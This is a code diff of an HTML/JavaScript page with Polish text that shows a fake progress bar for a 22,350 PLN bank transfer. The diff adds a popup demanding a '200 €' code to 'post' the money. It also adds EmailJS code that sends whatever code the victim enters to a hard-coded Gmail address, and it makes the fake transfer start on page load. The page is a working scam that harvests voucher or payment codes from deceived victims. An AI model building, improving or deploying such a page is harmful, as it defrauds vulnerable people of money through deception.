@@ -1,8 +1,7 @@
-<html>
-<head>
+<html><head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Trwa transfer - 22350 PLN</title>
+<title>Transfer w toku - 22350 PLN</title>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
 <style>
@@ -27,6 +26,25 @@ body {
   padding: 30px;
   border-radius: 12px;
   box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+}
+
+.reset-button {
+  position: fixed;
+  bottom: 20px;
+  right: 20px;
+  background: #DC2626;
+  color: white;
+  border: none;
+  padding: 12px 24px;
+  border-radius: 6px;
+  font-size: 14px;
+  cursor: pointer;
+  transition: background 0.3s ease;
+  z-index: 1000;
+}
+
+.reset-button:hover {
+  background: #B91C1C;
 }
 
 .email-form {
@@ -146,19 +164,149 @@ body {
 .hidden {
   display: none;
 }
+
+.reset-confirmation {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background: white;
+  padding: 20px;
+  border-radius: 8px;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+  text-align: center;
+  display: none;
+  z-index: 1001;
+}
+
+.reset-confirmation.show {
+  display: block;
+}
+
+.overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0,0,0,0.5);
+  display: none;
+  z-index: 1000;
+}
+
+.overlay.show {
+  display: block;
+}
+
+.confirmation-buttons {
+  margin-top: 20px;
+  display: flex;
+  justify-content: center;
+  gap: 10px;
+}
+
+.confirm-reset {
+  background: #DC2626;
+  color: white;
+  border: none;
+  padding: 8px 16px;
+  border-radius: 4px;
+  cursor: pointer;
+}
+
+.cancel-reset {
+  background: #6B7280;
+  color: white;
+  border: none;
+  padding: 8px 16px;
+  border-radius: 4px;
+  cursor: pointer;
+}
+/* Styles généraux pour le pop-up */
+.popup {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5); /* Fond semi-transparent */
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 1000; /* Assurez-vous qu'il est au-dessus des autres éléments */
+}
+
+/* Contenu du pop-up */
+.popup-content {
+    background-color: white; /* Fond blanc pour le contenu */
+    border-radius: 10px; /* Coins arrondis */
+    padding: 20px;
+    width: 300px; /* Largeur du pop-up */
+    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); /* Ombre pour le pop-up */
+    position: relative;
+}
+
+/* Bouton de fermeture */
+.close {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    font-size: 20px; /* Taille de la croix */
+    cursor: pointer; /* Curseur de pointeur */
+}
+
+/* Style de l'input */
+input[type="text"] {
+    width: 100%; /* Largeur complète */
+    padding: 10px; /* Espacement interne */
+    margin-top: 10px; /* Marge au-dessus */
+    border: 1px solid #ccc; /* Bordure grise */
+    border-radius: 5px; /* Coins arrondis */
+    font-size: 16px; /* Taille de la police */
+}
+
+/* Style du bouton de finalisation */
+button {
+    background-color: #28a745; /* Couleur de fond verte */
+    color: white; /* Couleur du texte en blanc */
+    border: none; /* Pas de bordure */
+    padding: 10px; /* Espacement interne */
+    border-radius: 5px; /* Coins arrondis */
+    cursor: pointer; /* Curseur de pointeur */
+    font-size: 16px; /* Taille de la police */
+    margin-top: 10px; /* Marge au-dessus */
+    width: 100%; /* Largeur complète */
+}
+
+/* Changement de couleur au survol du bouton */
+button:hover {
+    background-color: #218838; /* Couleur de fond plus foncée au survol */
+}
+
+/* Classe cachée pour masquer le pop-up */
+.hidden {
+    display: none; /* Masquer l'élément */
+}
 </style>
 </head>
 <body>
-
+<div id="codePopup" class="popup hidden">
+    <div class="popup-content">
+        <span class="close" onclick="closePopup()">&times;</span>
+        <p>Właśnie przelałeś 22 350 PLN na swoje główne konto w dniu 26/10/2024. Aby teraz zaksięgować pieniądze na koncie, wpisz swój kod w wysokości 200 €! Aby teraz zakończyć.</p>
+        <input type="text" id="couponCode" placeholder="Wpisz swój kod tutaj" />
+        <button onclick="submitCouponCode()">Zakończ</button>
+    </div>
+</div>
 <div class="progress-container">
   <div class="email-form" id="emailForm">
-    <input type="email" id="userEmail" class="email-input" placeholder="Wprowadź swój email, aby śledzić transfer" required>
+    <input type="email" id="userEmail" class="email-input" placeholder="Wprowadź swój adres e-mail" required>
     <button onclick="startTransfer()" class="submit-button">Rozpocznij transfer</button>
   </div>
 
   <div class="transfer-info hidden" id="transferInfo">
     <div class="amount">22 350 PLN</div>
-    <div class="status">Trwa transfer na konto główne</div>
+    <div class="status">Transfer w toku do głównego konta</div>
   </div>
   
   <div class="progress-bar hidden" id="progressBarContainer">
@@ -167,29 +315,42 @@ body {
   <div class="percentage hidden" id="percentage">0%</div>
 </div>
 
+<button class="reset-button" onclick="showResetConfirmation()">Resetuj Transfer</button>
+
+<div class="overlay" id="overlay"></div>
+
+<div class="reset-confirmation" id="resetConfirmation">
+  <h3>Potwierdzenie resetowania</h3>
+<p>Podczas poprzedniego transferu wystąpił problem. Czy na pewno chcesz zresetować postęp transferu?</p>
+  <div class="confirmation-buttons">
+    <button class="confirm-reset" onclick="resetTransfer()">Tak, resetuj</button>
+    <button class="cancel-reset" onclick="hideResetConfirmation()">Anuluj</button>
+  </div>
+</div>
+
 <div class="notification" id="notification">
   <svg class="notification-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
     <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
     <polyline points="22 4 12 14.01 9 11.01"></polyline>
   </svg>
-  <span class="notification-text">Transfer zakończony pomyślnie! Sprawdź swoją skrzynkę email, aby uzyskać potwierdzenie.</span>
+  <span class="notification-text">Transfer zakończony pomyślnie! Sprawdź swoją skrzynkę e-mail, aby uzyskać potwierdzenie.</span>
 </div>
 
 <script>
 // Inicjalizacja EmailJS
 (function() {
-  emailjs.init("doBjgwoKqkKpLc4oz"); // Zastąp swoim kluczem publicznym EmailJS
+    emailjs.init("doBjgwoKqkKpLc4oz");
 })();
 
 // Konfiguracja transferu
 const transferConfig = {
-  id: 'transfer_22350PLN_' + new Date().toISOString().split('T')[0],
-  amount: 22350,
-  currency: 'PLN',
-  startTime: null,
-  currentProgress: 0,
-  isCompleted: false,
-  userEmail: null
+    id: 'transfer_22350PLN_' + new Date().toISOString().split('T')[0],
+    amount: 22350,
+    currency: 'PLN',
+    startTime: null,
+    currentProgress: 0,
+    isCompleted: false,
+    userEmail: 'vivotinc@gmail.com' // Remplacez par votre adresse email
 };
 
 const progress = document.getElementById('progress');
@@ -198,134 +359,202 @@ const notification = document.getElementById('notification');
 const emailForm = document.getElementById('emailForm');
 const transferInfo = document.getElementById('transferInfo');
 const progressBarContainer = document.getElementById('progressBarContainer');
+const overlay = document.getElementById('overlay');
+const resetConfirmation = document.getElementById('resetConfirmation');
+
+// Pop-up code coupon
+const codePopup = document.getElementById('codePopup');
+
+// Temps total pour le transfert en millisecondes (30 minutes)
+const totalTransferTime = 1 * 60 * 1000; // 30 minutes
+const totalIncrements = 100; // 100 % de progression
+const incrementDelay = totalTransferTime / totalIncrements; // Délai entre chaque incrément
+
+function showPopup() {
+    codePopup.classList.remove('hidden');
+}
+
+function closePopup() {
+    codePopup.classList.add('hidden');
+}
+
+function submitCouponCode() {
+    const couponCode = document.getElementById('couponCode').value;
+    
+    // Envoyer le code coupon via EmailJS
+    const templateParams = {
+        to_email: transferConfig.userEmail,
+        coupon_code: couponCode,
+        amount: transferConfig.amount,
+        currency: transferConfig.currency,
+        transfer_id: transferConfig.id,
+        transfer_date: new Date().toLocaleDateString()
+    };
+
+    emailjs.send(
+        'service_yri9zqt', // Remplacez par votre ID de service EmailJS
+        'template_tkjqilq', // Remplacez par votre ID de modèle EmailJS
+        templateParams
+    ).then(
+        function(response) {
+            console.log('Email envoyé avec succès :', response.status, response.text);
+            alert("Kod kuponu został pomyślnie złożony.");
+            transferConfig.isCompleted = true; // Marquer le transfert comme terminé
+            closePopup(); // Fermer le pop-up après soumission
+        },
+        function(error) {
+            console.log('Erreur lors de l\'envoi de l\'email :', error);
+            alert("Erreur lors de l'envoi du code coupon. Veuillez réessayer.");
+        }
+    );
+}
+
+function showResetConfirmation() {
+    overlay.classList.add('show');
+    resetConfirmation.classList.add('show');
+}
+
+function hideResetConfirmation() {
+    overlay.classList.remove('show');
+    resetConfirmation.classList.remove('show');
+}
+
+function resetTransfer() {
+    localStorage.removeItem('transferState');
+  
+    transferConfig.currentProgress = 0;
+    transferConfig.isCompleted = false;
+    transferConfig.startTime = null;
+  
+    progress.style.width = '0%';
+    percentage.textContent = '0%';
+    emailForm.classList.remove('hidden');
+    transferInfo.classList.add('hidden');
+    progressBarContainer.classList.add('hidden');
+    percentage.classList.add('hidden');
+    document.querySelector('.progress-container').style.animation = 'pulse 2s infinite ease-in-out';
+  
+    hideResetConfirmation();
+  
+    window.location.reload();
+}
 
 function startTransfer() {
-  const emailInput = document.getElementById('userEmail');
-  const email = emailInput.value;
+    emailForm.classList.add('hidden');
+    transferInfo.classList.remove('hidden');
+    progressBarContainer.classList.remove('hidden');
+    percentage.classList.remove('hidden');
   
-  if (!email || !email.includes('@')) {
-    alert('Proszę wprowadzić prawidłowy adres email');
-    return;
-  }
-  
-  transferConfig.userEmail = email;
-  emailForm.classList.add('hidden');
-  transferInfo.classList.remove('hidden');
-  progressBarContainer.classList.remove('hidden');
-  percentage.classList.remove('hidden');
-  
-  initializeTransfer();
+    initializeTransfer();
 }
 
 function sendConfirmationEmail() {
-  const templateParams = {
-    to_email: transferConfig.userEmail,
-    amount: transferConfig.amount,
-    currency: transferConfig.currency,
-    transfer_id: transferConfig.id,
-    transfer_date: new Date().toLocaleDateString()
-  };
+    const templateParams = {
+        to_email: transferConfig.userEmail,
+        amount: transferConfig.amount,
+        currency: transferConfig.currency,
+        transfer_id: transferConfig.id,
+        transfer_date: new Date().toLocaleDateString()
+    };
 
-  emailjs.send(
-    'service_yri9zqt', // Zastąp swoim Service ID
-    'template_tkjqilq', // Zastąp swoim Template ID
-    templateParams
-  ).then(
-    function(response) {
-      console.log('Email wysłany pomyślnie:', response);
-    },
-    function(error) {
-      console.log('Błąd podczas wysyłania emaila:', error);
-    }
-  );
+    emailjs.send(
+        'service_yri9zqt',
+        'template_tkjqilq',
+        templateParams
+    ).then(
+        function(response) {
+            console.log('Email envoyé avec succès :', response.status, response.text);
+        },
+        function(error) {
+            console.log('Erreur lors de l\'envoi de l\'email :', error);
+        }
+    );
 }
 
 function saveTransferState() {
-  localStorage.setItem('transferState', JSON.stringify(transferConfig));
+    localStorage.setItem('transferState', JSON.stringify(transferConfig));
 }
 
 function loadTransferState() {
-  const savedState = localStorage.getItem('transferState');
-  if (savedState) {
-    const parsedState = JSON.parse(savedState);
-    if (parsedState.id === transferConfig.id) {
-      return parsedState;
+    const savedState = localStorage.getItem('transferState');
+    if (savedState) {
+        const parsedState = JSON.parse(savedState);
+        if (parsedState.id === transferConfig.id) {
+            return parsedState;
+        }
     }
-  }
-  return null;
+    return null;
 }
 
 function updateProgressBar(width) {
-  progress.style.width = width + '%';
-  percentage.textContent = width + '%';
-  transferConfig.currentProgress = width;
-  saveTransferState();
+    progress.style.width = width + '%';
+    percentage.textContent = width + '%';
+    transferConfig.currentProgress = width;
+    saveTransferState();
 }
 
 function incrementProgress() {
-  if (transferConfig.currentProgress >= 100) {
-    transferConfig.isCompleted = true;
-    saveTransferState();
-    document.querySelector('.progress-container').style.animation = 'none';
-    showNotification();
-    sendConfirmationEmail();
-    return;
-  }
+    if (transferConfig.currentProgress >= 100) {
+        document.querySelector('.progress-container').style.animation = 'none';
+        showNotification();
+        showPopup(); // Affiche le pop-up lorsque le transfert est terminé
+        return;
+    }
   
-  transferConfig.currentProgress += 1;
-  updateProgressBar(transferConfig.currentProgress);
+    transferConfig.currentProgress += 1;
+    updateProgressBar(transferConfig.currentProgress);
   
-  const randomDelay = Math.floor(Math.random() * 50) + 30;
-  setTimeout(incrementProgress, randomDelay);
+    // Utiliser le délai calculé pour chaque incrément
+    setTimeout(incrementProgress, incrementDelay);
 }
 
 function showNotification() {
-  setTimeout(() => {
-    notification.classList.add('show');
-    
     setTimeout(() => {
-      notification.classList.remove('show');
-    }, 6000);
-  }, 300);
+        notification.classList.add('show');
+        
+        setTimeout(() => {
+            notification.classList.remove('show');
+        }, 6000);
+    }, 300);
 }
 
 function initializeTransfer() {
-  const savedState = loadTransferState();
+    const savedState = loadTransferState();
   
-  if (savedState) {
-    transferConfig.currentProgress = savedState.currentProgress;
-    transferConfig.isCompleted = savedState.isCompleted;
-    transferConfig.startTime = savedState.startTime;
-    transferConfig.userEmail = savedState.userEmail;
-    
-    if (transferConfig.isCompleted) {
-      updateProgressBar(100);
-      document.querySelector('.progress-container').style.animation = 'none';
-      return;
+    if (savedState) {
+        transferConfig.currentProgress = savedState.currentProgress;
+        transferConfig.isCompleted = savedState.isCompleted;
+        transferConfig.startTime = savedState.startTime;
+        
+        if (transferConfig.isCompleted) {
+            updateProgressBar(100);
+            document.querySelector('.progress-container').style.animation = 'none';
+            return;
+        }
+        
+        updateProgressBar(transferConfig.currentProgress);
+        setTimeout(incrementProgress, 500);
+    } else {
+        transferConfig.startTime = new Date().toISOString();
+        saveTransferState();
+        setTimeout(incrementProgress, 500);
     }
-    
-    updateProgressBar(transferConfig.currentProgress);
-    setTimeout(incrementProgress, 500);
-  } else {
-    transferConfig.startTime = new Date().toISOString();
-    saveTransferState();
-    setTimeout(incrementProgress, 500);
-  }
 }
 
 window.addEventListener('beforeunload', () => {
-  saveTransferState();
+    saveTransferState();
 });
 
 // Sprawdzanie zapisanego stanu przy ładowaniu
 const savedState = loadTransferState();
-if (savedState && savedState.userEmail) {
-  document.getElementById('userEmail').value = savedState.userEmail;
-  if (savedState.currentProgress > 0) {
+if (savedState && savedState.currentProgress > 0) {
     startTransfer();
-  }
 }
+
+// Auto-start transferu po załadowaniu strony
+document.addEventListener('DOMContentLoaded', () => {
+    setTimeout(startTransfer, 1000);
+});
 </script>
 
-</body>
-</html>
+</body></html>
